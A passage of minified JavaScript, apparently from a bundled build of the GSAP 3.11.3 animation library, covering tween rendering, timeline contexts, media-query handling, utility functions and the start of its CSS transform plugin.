        s(e, t);
        var i = e.prototype;
        return i.render = function (t, e, i) {
          var n, r, s, o, l, c, h, u, f, d = this._time,
            p = this._tDur,
            m = this._dur,
            v = t < 0,
            g = t > p - S && !v ? p : t < S ? 0 : t;
          if (m) {
            if (g !== this._tTime || !t || i || !this._initted && this._tTime || this._startAt && this._zTime < 0 !== v) {
              if (n = g, u = this.timeline, this._repeat) {
                if (o = m + this._rDelay, this._repeat < -1 && v) return this.totalTime(100 * o + t, e, i);
                if (n = gt(g % o), g === p ? (s = this._repeat, n = m) : ((s = ~~(g / o)) && s === g / o && (n = m, s--), n > m && (n = m)), (c = this._yoyo && 1 & s) && (f = this._yEase, n = m - n), l = zt(this._tTime, o), n === d && !i && this._initted) return this._tTime = g, this;
                s !== l && (u && this._yEase && Le(u, c), !this.vars.repeatRefresh || c || this._lock || (this._lock = i = 1, this.render(gt(o * s), !0).invalidate()._lock = 0))
              }
              if (!this._initted) {
                if (Vt(this, v ? t : n, i, e, g)) return this._tTime = 0, this;
                if (d !== this._time) return this;
                if (m !== this._dur) return this.render(t, e, i)
              }
              if (this._tTime = g, this._time = n, !this._act && this._ts && (this._act = 1, this._lazy = 0), this.ratio = h = (f || this._ease)(n / m), this._from && (this.ratio = h = 1 - h), n && !d && !e && (pe(this, "onStart"), this._tTime !== g)) return this;
              for (r = this._pt; r;) r.r(h, r.d), r = r._next;
              u && u.render(t < 0 ? t : !n && c ? -1e-8 : u._dur * u._ease(n / this._dur), e, i) || this._startAt && (this._zTime = t), this._onUpdate && !e && (v && Rt(this, t, 0, i), pe(this, "onUpdate")), this._repeat && s !== l && this.vars.onRepeat && !e && this.parent && pe(this, "onRepeat"), g !== this._tDur && g || this._tTime !== g || (v && !this._onUpdate && Rt(this, t, 0, !0), (t || !m) && (g === this._tDur && this._ts > 0 || !g && this._ts < 0) && Dt(this, 1), e || v && !d || !(g || d || c) || (pe(this, g === p ? "onComplete" : "onReverseComplete", !0), this._prom && !(g < p && this.timeScale() > 0) && this._prom()))
            }
          } else ! function (t, e, i, n) {
            var r, s, o, l = t.ratio,
              c = e < 0 || !e && (!t._start && Nt(t) && (t._initted || !qt(t)) || (t._ts < 0 || t._dp._ts < 0) && !qt(t)) ? 0 : 1,
              h = t._rDelay,
              u = 0;
            if (h && t._repeat && (u = Jt(0, t._tDur, e), s = zt(u, h), t._yoyo && 1 & s && (c = 1 - c), s !== zt(t._tTime, h) && (l = 1 - c, t.vars.repeatRefresh && t._initted && t.invalidate())), c !== l || a || n || t._zTime === S || !e && t._zTime) {
              if (!t._initted && Vt(t, e, n, i, u)) return;
              for (o = t._zTime, t._zTime = e || (i ? S : 0), i || (i = e && !o), t.ratio = c, t._from && (c = 1 - c), t._time = 0, t._tTime = u, r = t._pt; r;) r.r(c, r.d), r = r._next;
              e < 0 && Rt(t, e, 0, !0), t._onUpdate && !i && pe(t, "onUpdate"), u && t._repeat && !i && t.parent && pe(t, "onRepeat"), (e >= t._tDur || e < 0) && t.ratio === c && (c && Dt(t, 1), i || a || (pe(t, c ? "onComplete" : "onReverseComplete", !0), t._prom && t._prom()))
            } else t._zTime || (t._zTime = e)
          }(this, t, e, i);
          return this
        }, i.targets = function () {
          return this._targets
        }, i.invalidate = function (e) {
          return (!e || !this.vars.runBackwards) && (this._startAt = 0), this._pt = this._op = this._onUpdate = this._lazy = this.ratio = 0, this._ptLookup = [], this.timeline && this.timeline.invalidate(e), t.prototype.invalidate.call(this, e)
        }, i.resetTo = function (t, e, i, n) {
          v || Ee.wake(), this._ts || this.play();
          var r = Math.min(this._dur, (this._dp._time - this._start) * this._ts);
          return this._initted || Ue(this, r),
            function (t, e, i, n, r, s, o) {
              var a, l, c, h, u = (t._pt && t._ptCache || (t._ptCache = {}))[e];
              if (!u)
                for (u = t._ptCache[e] = [], c = t._ptLookup, h = t._targets.length; h--;) {
                  if ((a = c[h][e]) && a.d && a.d._pt)
                    for (a = a.d._pt; a && a.p !== e && a.fp !== e;) a = a._next;
                  if (!a) return We = 1, t.vars[e] = "+=0", Ue(t, o), We = 0, 1;
                  u.push(a)
                }
              for (h = u.length; h--;)(a = (l = u[h])._pt || l).s = !n && 0 !== n || r ? a.s + (n || 0) + s * a.c : n, a.c = i - a.s, l.e && (l.e = vt(i) + te(l.e)), l.b && (l.b = a.s + te(l.b))
            }(this, t, e, i, n, this._ease(r / this._dur), r) ? this.resetTo(t, e, i, n) : (Xt(this, 0), this.parent || At(this._dp, this, "_first", "_last", this._dp._sort ? "_start" : 0), this.render(0))
        }, i.kill = function (t, e) {
          if (void 0 === e && (e = "all"), !(t || e && "all" !== e)) return this._lazy = this._pt = 0, this.parent ? me(this) : this;
          if (this.timeline) {
            var i = this.timeline.totalDuration();
            return this.timeline.killTweensOf(t, e, je && !0 !== je.vars.overwrite)._first || me(this), this.parent && i !== this.timeline.totalDuration() && Ut(this, this._dur * this.timeline._tDur / i, 0, 1), this
          }
          var n, r, s, o, a, l, c, h = this._targets,
            u = t ? ne(t) : h,
            f = this._ptLookup,
            d = this._pt;
          if ((!e || "all" === e) && function (t, e) {
              for (var i = t.length, n = i === e.length; n && i-- && t[i] === e[i];);
              return i < 0
            }(h, u)) return "all" === e && (this._pt = 0), me(this);
          for (n = this._op = this._op || [], "all" !== e && (D(e) && (a = {}, mt(e, (function (t) {
              return a[t] = 1
            })), e = a), e = function (t, e) {
              var i, n, r, s, o = t[0] ? dt(t[0]).harness : 0,
                a = o && o.aliases;
              if (!a) return e;
              for (n in i = kt({}, e), a)
                if (n in i)
                  for (r = (s = a[n].split(",")).length; r--;) i[s[r]] = i[n];
              return i
            }(h, e)), c = h.length; c--;)
            if (~u.indexOf(h[c]))
              for (a in r = f[c], "all" === e ? (n[c] = e, o = r, s = {}) : (s = n[c] = n[c] || {}, o = e), o)(l = r && r[a]) && ("kill" in l.d && !0 !== l.d.kill(a) || Ct(this, l, "_pt"), delete r[a]), "all" !== s && (s[a] = 1);
          return this._initted && !this._pt && d && me(this), this
        }, e.to = function (t, i) {
          return new e(t, i, arguments[2])
        }, e.from = function (t, e) {
          return Qt(1, arguments)
        }, e.delayedCall = function (t, i, n, r) {
          return new e(i, 0, {
            immediateRender: !1,
            lazy: !1,
            overwrite: !1,
            delay: t,
            onComplete: i,
            onReverseComplete: i,
            onCompleteParams: n,
            onReverseCompleteParams: n,
            callbackScope: r
          })
        }, e.fromTo = function (t, e, i) {
          return Qt(2, arguments)
        }, e.set = function (t, i) {
          return i.duration = 0, i.repeatDelay || (i.repeat = 0), new e(t, i)
        }, e.killTweensOf = function (t, e, i) {
          return c.killTweensOf(t, e, i)
        }, e
      }(Xe);
      St($e.prototype, {
        _targets: [],
        _lazy: 0,
        _startAt: 0,
        _op: 0,
        _onInit: 0
      }), mt("staggerTo,staggerFrom,staggerFromTo", (function (t) {
        $e[t] = function () {
          var e = new He,
            i = ee.call(arguments, 0);
          return i.splice("staggerFromTo" === t ? 5 : 4, 0, 0), e[t].apply(e, i)
        }
      }));
      var Je = function (t, e, i) {
          return t[e] = i
        },
        ti = function (t, e, i) {
          return t[e](i)
        },
        ei = function (t, e, i, n) {
          return t[e](n.fp, i)
        },
        ii = function (t, e, i) {
          return t.setAttribute(e, i)
        },
        ni = function (t, e) {
          return P(t[e]) ? ti : R(t[e]) && t.setAttribute ? ii : Je
        },
        ri = function (t, e) {
          return e.set(e.t, e.p, Math.round(1e6 * (e.s + e.c * t)) / 1e6, e)
        },
        si = function (t, e) {
          return e.set(e.t, e.p, !!(e.s + e.c * t), e)
        },
        oi = function (t, e) {
          var i = e._pt,
            n = "";
          if (!t && e.b) n = e.b;
          else if (1 === t && e.e) n = e.e;
          else {
            for (; i;) n = i.p + (i.m ? i.m(i.s + i.c * t) : Math.round(1e4 * (i.s + i.c * t)) / 1e4) + n, i = i._next;
            n += e.c
          }
          e.set(e.t, e.p, n, e)
        },
        ai = function (t, e) {
          for (var i = e._pt; i;) i.r(t, i.d), i = i._next
        },
        li = function (t, e, i, n) {
          for (var r, s = this._pt; s;) r = s._next, s.p === n && s.modifier(t, e, i), s = r
        },
        ci = function (t) {
          for (var e, i, n = this._pt; n;) i = n._next, n.p === t && !n.op || n.op === t ? Ct(this, n, "_pt") : n.dep || (e = 1), n = i;
          return !e
        },
        hi = function (t, e, i, n) {
          n.mSet(t, e, n.m.call(n.tween, i, n.mt), n)
        },
        ui = function (t) {
          for (var e, i, n, r, s = t._pt; s;) {
            for (e = s._next, i = n; i && i.pr > s.pr;) i = i._next;
            (s._prev = i ? i._prev : r) ? s._prev._next = s: n = s, (s._next = i) ? i._prev = s : r = s, s = e
          }
          t._pt = n
        },
        fi = function () {
          function t(t, e, i, n, r, s, o, a, l) {
            this.t = e, this.s = n, this.c = r, this.p = i, this.r = s || ri, this.d = o || this, this.set = a || Je, this.pr = l || 0, this._next = t, t && (t._prev = this)
          }
          return t.prototype.modifier = function (t, e, i) {
            this.mSet = this.mSet || this.set, this.set = hi, this.m = t, this.mt = i, this.tween = e
          }, t
        }();
      mt(ut + "parent,duration,ease,delay,overwrite,runBackwards,startAt,yoyo,immediateRender,repeat,repeatDelay,data,paused,reversed,lazy,callbackScope,stringFilter,id,yoyoEase,stagger,inherit,repeatRefresh,keyframes,autoRevert,scrollTrigger", (function (t) {
        return rt[t] = 1
      })), G.TweenMax = G.TweenLite = $e, G.TimelineLite = G.TimelineMax = He, c = new He({
        sortChildren: !1,
        defaults: x,
        autoRemoveChildren: !0,
        id: "root",
        smoothChildTiming: !0
      }), w.stringFilter = ke;
      var di = [],
        pi = {},
        mi = [],
        vi = 0,
        gi = function (t) {
          return (pi[t] || mi).map((function (t) {
            return t()
          }))
        },
        yi = function () {
          var t = Date.now(),
            e = [];
          t - vi > 2 && (gi("matchMediaInit"), di.forEach((function (t) {
            var i, n, r, s, o = t.queries,
              a = t.conditions;
            for (n in o)(i = h.matchMedia(o[n]).matches) && (r = 1), i !== a[n] && (a[n] = i, s = 1);
            s && (t.revert(), r && e.push(t))
          })), gi("matchMediaRevert"), e.forEach((function (t) {
            return t.onMatch(t)
          })), vi = t, gi("matchMedia"))
        },
        _i = function () {
          function t(t, e) {
            this.selector = e && re(e), this.data = [], this._r = [], this.isReverted = !1, t && this.add(t)
          }
          var e = t.prototype;
          return e.add = function (t, e, i) {
            P(t) && (i = e, e = t, t = P);
            var n = this,
              r = function () {
                var t, r = l,
                  s = n.selector;
                return r && r !== n && r.data.push(n), i && (n.selector = re(i)), l = n, t = e.apply(n, arguments), P(t) && n._r.push(t), l = r, n.selector = s, n.isReverted = !1, t
              };
            return n.last = r, t === P ? r(n) : t ? n[t] = r : r
          }, e.ignore = function (t) {
            var e = l;
            l = null, t(this), l = e
          }, e.getTweens = function () {
            var e = [];
            return this.data.forEach((function (i) {
              return i instanceof t ? e.push.apply(e, i.getTweens()) : i instanceof $e && !(i.parent && "nested" === i.parent.data) && e.push(i)
            })), e
          }, e.clear = function () {
            this._r.length = this.data.length = 0
          }, e.kill = function (t, e) {
            var i = this;
            if (t) {
              var n = this.getTweens();
              this.data.forEach((function (t) {
                "isFlip" === t.data && (t.revert(), t.getChildren(!0, !0, !1).forEach((function (t) {
                  return n.splice(n.indexOf(t), 1)
                })))
              })), n.map((function (t) {
                return {
                  g: t.globalTime(0),
                  t: t
                }
              })).sort((function (t, e) {
                return e.g - t.g || -1
              })).forEach((function (e) {
                return e.t.revert(t)
              })), this.data.forEach((function (e) {
                return !(e instanceof Xe) && e.revert && e.revert(t)
              })), this._r.forEach((function (e) {
                return e(t, i)
              })), this.isReverted = !0
            } else this.data.forEach((function (t) {
              return t.kill && t.kill()
            }));
            if (this.clear(), e) {
              var r = di.indexOf(this);
              ~r && di.splice(r, 1)
            }
          }, e.revert = function (t) {
            this.kill(t || {})
          }, t
        }(),
        bi = function () {
          function t(t) {
            this.contexts = [], this.scope = t
          }
          var e = t.prototype;
          return e.add = function (t, e, i) {
            B(t) || (t = {
              matches: t
            });
            var n, r, s, o = new _i(0, i || this.scope),
              a = o.conditions = {};
            for (r in this.contexts.push(o), e = o.add("onMatch", e), o.queries = t, t) "all" === r ? s = 1 : (n = h.matchMedia(t[r])) && (di.indexOf(o) < 0 && di.push(o), (a[r] = n.matches) && (s = 1), n.addListener ? n.addListener(yi) : n.addEventListener("change", yi));
            return s && e(o), this
          }, e.revert = function (t) {
            this.kill(t || {})
          }, e.kill = function (t) {
            this.contexts.forEach((function (e) {
              return e.kill(t, !0)
            }))
          }, t
        }(),
        wi = {
          registerPlugin: function () {
            for (var t = arguments.length, e = new Array(t), i = 0; i < t; i++) e[i] = arguments[i];
            e.forEach((function (t) {
              return ve(t)
            }))
          },
          timeline: function (t) {
            return new He(t)
          },
          getTweensOf: function (t, e) {
            return c.getTweensOf(t, e)
          },
          getProperty: function (t, e, i, n) {
            D(t) && (t = ne(t)[0]);
            var r = dt(t || {}).get,
              s = i ? Tt : xt;
            return "native" === i && (i = ""), t ? e ? s((at[e] && at[e].get || r)(t, e, i, n)) : function (e, i, n) {
              return s((at[e] && at[e].get || r)(t, e, i, n))
            } : t
          },
          quickSetter: function (t, e, i) {
            if ((t = ne(t)).length > 1) {
              var n = t.map((function (t) {
                  return Si.quickSetter(t, e, i)
                })),
                r = n.length;
              return function (t) {
                for (var e = r; e--;) n[e](t)
              }
            }
            t = t[0] || {};
            var s = at[e],
              o = dt(t),
              a = o.harness && (o.harness.aliases || {})[e] || e,
              l = s ? function (e) {
                var n = new s;
                m._pt = 0, n.init(t, i ? e + i : e, m, 0, [t]), n.render(1, n), m._pt && ai(1, m)
              } : o.set(t, a);
            return s ? l : function (e) {
              return l(t, a, i ? e + i : e, o, 1)
            }
          },
          quickTo: function (t, e, i) {
            var n, r = Si.to(t, kt(((n = {})[e] = "+=0.1", n.paused = !0, n), i || {})),
              s = function (t, i, n) {
                return r.resetTo(e, t, i, n)
              };
            return s.tween = r, s
          },
          isTweening: function (t) {
            return c.getTweensOf(t, !0).length > 0
          },
          defaults: function (t) {
            return t && t.ease && (t.ease = Re(t.ease, x.ease)), Et(x, t || {})
          },
          config: function (t) {
            return Et(w, t || {})
          },
          registerEffect: function (t) {
            var e = t.name,
              i = t.effect,
              n = t.plugins,
              r = t.defaults,
              s = t.extendTimeline;
            (n || "").split(",").forEach((function (t) {
              return t && !at[t] && !G[t] && $(e + " effect requires " + t + " plugin.")
            })), lt[e] = function (t, e, n) {
              return i(ne(t), St(e || {}, r), n)
            }, s && (He.prototype[e] = function (t, i, n) {
              return this.add(lt[e](t, B(i) ? i : (n = i) && {}, this), n)
            })
          },
          registerEase: function (t, e) {
            Oe[t] = Re(e)
          },
          parseEase: function (t, e) {
            return arguments.length ? Re(t, e) : Oe
          },
          getById: function (t) {
            return c.getById(t)
          },
          exportRoot: function (t, e) {
            void 0 === t && (t = {});
            var i, n, r = new He(t);
            for (r.smoothChildTiming = I(t.smoothChildTiming), c.remove(r), r._dp = 0, r._time = r._tTime = c._time, i = c._first; i;) n = i._next, !e && !i._dur && i instanceof $e && i.vars.onComplete === i._targets[0] || jt(r, i, i._start - i._delay), i = n;
            return jt(c, r, 0), r
          },
          context: function (t, e) {
            return t ? new _i(t, e) : l
          },
          matchMedia: function (t) {
            return new bi(t)
          },
          matchMediaRefresh: function () {
            return di.forEach((function (t) {
              var e, i, n = t.conditions;
              for (i in n) n[i] && (n[i] = !1, e = 1);
              e && t.revert()
            })) || yi()
          },
          addEventListener: function (t, e) {
            var i = pi[t] || (pi[t] = []);
            ~i.indexOf(e) || i.push(e)
          },
          removeEventListener: function (t, e) {
            var i = pi[t],
              n = i && i.indexOf(e);
            n >= 0 && i.splice(n, 1)
          },
          utils: {
            wrap: function t(e, i, n) {
              var r = i - e;
              return X(e) ? he(e, t(0, e.length), i) : $t(n, (function (t) {
                return (r + (t - e) % r) % r + e
              }))
            },
            wrapYoyo: function t(e, i, n) {
              var r = i - e,
                s = 2 * r;
              return X(e) ? he(e, t(0, e.length - 1), i) : $t(n, (function (t) {
                return e + ((t = (s + (t - e) % s) % s || 0) > r ? s - t : t)
              }))
            },
            distribute: oe,
            random: ce,
            snap: le,
            normalize: function (t, e, i) {
              return fe(t, e, 0, 1, i)
            },
            getUnit: te,
            clamp: function (t, e, i) {
              return $t(i, (function (i) {
                return Jt(t, e, i)
              }))
            },
            splitColor: be,
            toArray: ne,
            selector: re,
            mapRange: fe,
            pipe: function () {
              for (var t = arguments.length, e = new Array(t), i = 0; i < t; i++) e[i] = arguments[i];
              return function (t) {
                return e.reduce((function (t, e) {
                  return e(t)
                }), t)
              }
            },
            unitize: function (t, e) {
              return function (i) {
                return t(parseFloat(i)) + (e || te(i))
              }
            },
            interpolate: function t(e, i, n, r) {
              var s = isNaN(e + i) ? 0 : function (t) {
                return (1 - t) * e + t * i
              };
              if (!s) {
                var o, a, l, c, h, u = D(e),
                  f = {};
                if (!0 === n && (r = 1) && (n = null), u) e = {
                  p: e
                }, i = {
                  p: i
                };
                else if (X(e) && !X(i)) {
                  for (l = [], c = e.length, h = c - 2, a = 1; a < c; a++) l.push(t(e[a - 1], e[a]));
                  c--, s = function (t) {
                    t *= c;
                    var e = Math.min(h, ~~t);
                    return l[e](t - e)
                  }, n = i
                } else r || (e = kt(X(e) ? [] : {}, e));
                if (!l) {
                  for (o in i) Ne.call(f, e, o, "get", i[o]);
                  s = function (t) {
                    return ai(t, f) || (u ? e.p : e)
                  }
                }
              }
              return $t(n, s)
            },
            shuffle: se
          },
          install: Z,
          effects: lt,
          ticker: Ee,
          updateRoot: He.updateRoot,
          plugins: at,
          globalTimeline: c,
          core: {
            PropTween: fi,
            globals: J,
            Tween: $e,
            Timeline: He,
            Animation: Xe,
            getCache: dt,
            _removeLinkedListItem: Ct,
            reverting: function () {
              return a
            },
            context: function (t) {
              return t && l && (l.data.push(t), t._ctx = l), l
            },
            suppressOverwrites: function (t) {
              return o = t
            }
          }
        };
      mt("to,from,fromTo,delayedCall,set,killTweensOf", (function (t) {
        return wi[t] = $e[t]
      })), Ee.add(He.updateRoot), m = wi.to({}, {
        duration: 0
      });
      var xi = function (t, e) {
          for (var i = t._pt; i && i.p !== e && i.op !== e && i.fp !== e;) i = i._next;
          return i
        },
        Ti = function (t, e) {
          return {
            name: t,
            rawVars: 1,
            init: function (t, i, n) {
              n._onInit = function (t) {
                var n, r;
                if (D(i) && (n = {}, mt(i, (function (t) {
                    return n[t] = 1
                  })), i = n), e) {
                  for (r in n = {}, i) n[r] = e(i[r]);
                  i = n
                }! function (t, e) {
                  var i, n, r, s = t._targets;
                  for (i in e)
                    for (n = s.length; n--;)(r = t._ptLookup[n][i]) && (r = r.d) && (r._pt && (r = xi(r, i)), r && r.modifier && r.modifier(e[i], t, s[n], i))
                }(t, i)
              }
            }
          }
        },
        Si = wi.registerPlugin({
          name: "attr",
          init: function (t, e, i, n, r) {
            var s, o, a;
            for (s in this.tween = i, e) a = t.getAttribute(s) || "", (o = this.add(t, "setAttribute", (a || 0) + "", e[s], n, r, 0, 0, s)).op = s, o.b = a, this._props.push(s)
          },
          render: function (t, e) {
            for (var i = e._pt; i;) a ? i.set(i.t, i.p, i.b, i) : i.r(t, i.d), i = i._next
          }
        }, {
          name: "endArray",
          init: function (t, e) {
            for (var i = e.length; i--;) this.add(t, i, t[i] || 0, e[i], 0, 0, 0, 0, 0, 1)
          }
        }, Ti("roundProps", ae), Ti("modifiers"), Ti("snap", le)) || wi;

      function ki(t) {
        return (ki = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
          return typeof t
        } : function (t) {
          return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
        })(t)
      }
      $e.version = He.version = Si.version = "3.11.3", d = 1, z() && Me(), Oe.Power0, Oe.Power1, Oe.Power2, Oe.Power3, Oe.Power4, Oe.Linear, Oe.Quad, Oe.Cubic, Oe.Quart, Oe.Quint, Oe.Strong, Oe.Elastic, Oe.Back, Oe.SteppedEase, Oe.Bounce, Oe.Sine, Oe.Expo, Oe.Circ;
      var Ei, Mi, Oi, Ai, Ci, Di, Pi, Li, Ri = {},
        Bi = 180 / Math.PI,
        Ii = Math.PI / 180,
        zi = Math.atan2,
        Yi = /([A-Z])/g,
        Fi = /(left|right|width|margin|padding|x)/i,
        Xi = /[\s,\(]\S/,
        Hi = {
          autoAlpha: "opacity,visibility",
          scale: "scaleX,scaleY",
          alpha: "opacity"
        },
        ji = function (t, e) {
          return e.set(e.t, e.p, Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u, e)
        },
        Wi = function (t, e) {
          return e.set(e.t, e.p, 1 === t ? e.e : Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u, e)
        },
        Vi = function (t, e) {
          return e.set(e.t, e.p, t ? Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u : e.b, e)
        },
        Ni = function (t, e) {
          var i = e.s + e.c * t;
          e.set(e.t, e.p, ~~(i + (i < 0 ? -.5 : .5)) + e.u, e)
        },
        qi = function (t, e) {
          return e.set(e.t, e.p, t ? e.e : e.b, e)
        },
        Ui = function (t, e) {
          return e.set(e.t, e.p, 1 !== t ? e.b : e.e, e)
        },
        Gi = function (t, e, i) {
          return t.style[e] = i
        },
        Ki = function (t, e, i) {
          return t.style.setProperty(e, i)
        },
        Zi = function (t, e, i) {
          return t._gsap[e] = i
        },
        Qi = function (t, e, i) {
          return t._gsap.scaleX = t._gsap.scaleY = i
        },
        $i = function (t, e, i, n, r) {
          var s = t._gsap;
          s.scaleX = s.scaleY = i, s.renderTransform(r, s)
        },
        Ji = function (t, e, i, n, r) {
          var s = t._gsap;
          s[e] = i, s.renderTransform(r, s)
        },
        tn = "transform",
        en = tn + "Origin",
        nn = function (t, e) {
          var i = this,
            n = this.target,
            r = n.style;
          if (t in Ri) {
            if (this.tfm = this.tfm || {}, "transform" !== t && (~(t = Hi[t] || t).indexOf(",") ? t.split(",").forEach((function (t) {
                return i.tfm[t] = wn(n, t)
              })) : this.tfm[t] = n._gsap.x ? n._gsap[t] : wn(n, t)), this.props.indexOf(tn) >= 0) return;
            n._gsap.svg && (this.svgo = n.getAttribute("data-svg-origin"), this.props.push(en, e, "")), t = tn
          }(r || e) && this.props.push(t, e, r[t])
        },
        rn = function (t) {
          t.translate && (t.removeProperty("translate"), t.removeProperty("scale"), t.removeProperty("rotate"))
        },
        sn = function () {
          var t, e, i = this.props,
            n = this.target,
            r = n.style,
            s = n._gsap;
          for (t = 0; t < i.length; t += 3) i[t + 1] ? n[i[t]] = i[t + 2] : i[t + 2] ? r[i[t]] = i[t + 2] : r.removeProperty(i[t].replace(Yi, "-$1").toLowerCase());
          if (this.tfm) {
            for (e in this.tfm) s[e] = this.tfm[e];
            s.svg && (s.renderTransform(), n.setAttribute("data-svg-origin", this.svgo || "")), !(t = Pi()) || t.isStart || r[tn] || (rn(r), s.uncache = 1)
          }
        },
        on = function (t, e) {
          var i = {
            target: t,
            props: [],
            revert: sn,
            save: nn
          };
          return e && e.split(",").forEach((function (t) {
            return i.save(t)
          })), i
        },
        an = function (t, e) {
          var i = Mi.createElementNS ? Mi.createElementNS((e || "http://www.w3.org/1999/xhtml").replace(/^https/, "http"), t) : Mi.createElement(t);
          return i.style ? i : Mi.createElement(t)
        },
        ln = function t(e, i, n) {
          var r = getComputedStyle(e);
          return r[i] || r.getPropertyValue(i.replace(Yi, "-$1").toLowerCase()) || r.getPropertyValue(i) || !n && t(e, hn(i) || i, 1) || ""
        },
        cn = "O,Moz,ms,Ms,Webkit".split(","),
        hn = function (t, e, i) {
          var n = (e || Ci).style,
            r = 5;
          if (t in n && !i) return t;
          for (t = t.charAt(0).toUpperCase() + t.substr(1); r-- && !(cn[r] + t in n););
          return r < 0 ? null : (3 === r ? "ms" : r >= 0 ? cn[r] : "") + t
        },
        un = function () {
          "undefined" != typeof window && window.document && (Ei = window, Mi = Ei.document, Oi = Mi.documentElement, Ci = an("div") || {
            style: {}
          }, an("div"), tn = hn(tn), en = tn + "Origin", Ci.style.cssText = "border-width:0;line-height:0;position:absolute;padding:0", Li = !!hn("perspective"), Pi = Si.core.reverting, Ai = 1)
        },
        fn = function t(e) {
          var i, n = an("svg", this.ownerSVGElement && this.ownerSVGElement.getAttribute("xmlns") || "http://www.w3.org/2000/svg"),
            r = this.parentNode,
            s = this.nextSibling,
            o = this.style.cssText;
          if (Oi.appendChild(n), n.appendChild(this), this.style.display = "block", e) try {
            i = this.getBBox(), this._gsapBBox = this.getBBox, this.getBBox = t
          } catch (t) {} else this._gsapBBox && (i = this._gsapBBox());
          return r && (s ? r.insertBefore(this, s) : r.appendChild(this)), Oi.removeChild(n), this.style.cssText = o, i
        },
        dn = function (t, e) {
          for (var i = e.length; i--;)
            if (t.hasAttribute(e[i])) return t.getAttribute(e[i])
        },
        pn = function (t) {
          var e;
          try {
            e = t.getBBox()
          } catch (i) {
            e = fn.call(t, !0)
          }
          return e && (e.width || e.height) || t.getBBox === fn || (e = fn.call(t, !0)), !e || e.width || e.x || e.y ? e : {
            x: +dn(t, ["x", "cx", "x1"]) || 0,
            y: +dn(t, ["y", "cy", "y1"]) || 0,
            width: 0,
            height: 0
          }
        },
        mn = function (t) {
          return !(!t.getCTM || t.parentNode && !t.ownerSVGElement || !pn(t))
        },
        vn = function (t, e) {
          if (e) {
            var i = t.style;
            e in Ri && e !== en && (e = tn), i.removeProperty ? ("ms" !== e.substr(0, 2) && "webkit" !== e.substr(0, 6) || (e = "-" + e), i.removeProperty(e.replace(Yi, "-$1").toLowerCase())) : i.removeAttribute(e)
          }
        },
        gn = function (t, e, i, n, r, s) {
          var o = new fi(t._pt, e, i, 0, 1, s ? Ui : qi);
          return t._pt = o, o.b = n, o.e = r, t._props.push(i), o
        },
        yn = {
          deg: 1,
          rad: 1,
          turn: 1
        },
        _n = {
          grid: 1,
          flex: 1
        },
        bn = function t(e, i, n, r) {
          var s, o, a, l, c = parseFloat(n) || 0,
            h = (n + "").trim().substr((c + "").length) || "px",
            u = Ci.style,
            f = Fi.test(i),
            d = "svg" === e.tagName.toLowerCase(),
            p = (d ? "client" : "offset") + (f ? "Width" : "Height"),
            m = 100,
            v = "px" === r,
            g = "%" === r;
          return r === h || !c || yn[r] || yn[h] ? c : ("px" !== h && !v && (c = t(e, i, n, "px")), l = e.getCTM && mn(e), !g && "%" !== h || !Ri[i] && !~i.indexOf("adius") ? (u[f ? "width" : "height"] = m + (v ? h : r), o = ~i.indexOf("adius") || "em" === r && e.appendChild && !d ? e : e.parentNode, l && (o = (e.ownerSVGElement || {}).parentNode), o && o !== Mi && o.appendChild || (o = Mi.body), (a = o._gsap) && g && a.width && f && a.time === Ee.time && !a.uncache ? vt(c / a.width * m) : ((g || "%" === h) && !_n[ln(o, "display")] && (u.position = ln(e, "position")), o === e && (u.position = "static"), o.appendChild(Ci), s = Ci[p], o.removeChild(Ci), u.position = "absolute", f && g && ((a = dt(o)).time = Ee.time, a.width = o[p]), vt(v ? s * c / m : s && c ? m / s * c : 0))) : (s = l ? e.getBBox()[f ? "width" : "height"] : e[p], vt(g ? c / s * m : c / 100 * s)))
        },
        wn = function (t, e, i, n) {
          var r;
          return Ai || un(), e in Hi && "transform" !== e && ~(e = Hi[e]).indexOf(",") && (e = e.split(",")[0]), Ri[e] && "transform" !== e ? (r = Pn(t, n), r = "transformOrigin" !== e ? r[e] : r.svg ? r.origin : Ln(ln(t, en)) + " " + r.zOrigin + "px") : (!(r = t.style[e]) || "auto" === r || n || ~(r + "").indexOf("calc(")) && (r = kn[e] && kn[e](t, e, i) || ln(t, e) || pt(t, e) || ("opacity" === e ? 1 : 0)), i && !~(r + "").trim().indexOf(" ") ? bn(t, e, r, i) + i : r
        },
        xn = function (t, e, i, n) {
          if (!i || "none" === i) {
            var r = hn(e, t, 1),
              s = r && ln(t, r, 1);
            s && s !== i ? (e = r, i = s) : "borderColor" === e && (i = ln(t, "borderTopColor"))
          }
          var o, a, l, c, h, u, f, d, p, m, v, g = new fi(this._pt, t.style, e, 0, 1, oi),
            y = 0,
            _ = 0;
          if (g.b = i, g.e = n, i += "", "auto" == (n += "") && (t.style[e] = n, n = ln(t, e) || n, t.style[e] = i), ke(o = [i, n]), n = o[1], l = (i = o[0]).match(W) || [], (n.match(W) || []).length) {
            for (; a = W.exec(n);) f = a[0], p = n.substring(y, a.index), h ? h = (h + 1) % 5 : "rgba(" !== p.substr(-5) && "hsla(" !== p.substr(-5) || (h = 1), f !== (u = l[_++] || "") && (c = parseFloat(u) || 0, v = u.substr((c + "").length), "=" === f.charAt(1) && (f = yt(c, f) + v), d = parseFloat(f), m = f.substr((d + "").length), y = W.lastIndex - m.length, m || (m = m || w.units[e] || v, y === n.length && (n += m, g.e += m)), v !== m && (c = bn(t, e, u, m) || 0), g._pt = {
              _next: g._pt,
              p: p || 1 === _ ? p : ",",
              s: c,
              c: d - c,
              m: h && h < 4 || "zIndex" === e ? Math.round : 0
            });
            g.c = y < n.length ? n.substring(y, n.length) : ""
          } else g.r = "display" === e && "none" === n ? Ui : qi;
          return N.test(n) && (g.e = 0), this._pt = g, g
        },
        Tn = {
          top: "0%",
          bottom: "100%",
          left: "0%",
          right: "100%",
          center: "50%"
        },
        Sn = function (t, e) {
          if (e.tween && e.tween._time === e.tween._dur) {
            var i, n, r, s = e.t,
              o = s.style,
              a = e.u,
              l = s._gsap;
            if ("all" === a || !0 === a) o.cssText = "", n = 1;
            else
              for (r = (a = a.split(",")).length; --r > -1;) i = a[r], Ri[i] && (n = 1, i = "transformOrigin" === i ? en : tn), vn(s, i);
            n && (vn(s, tn), l && (l.svg && s.removeAttribute("transform"), Pn(s, 1), l.uncache = 1, rn(o)))
          }
        },
        kn = {
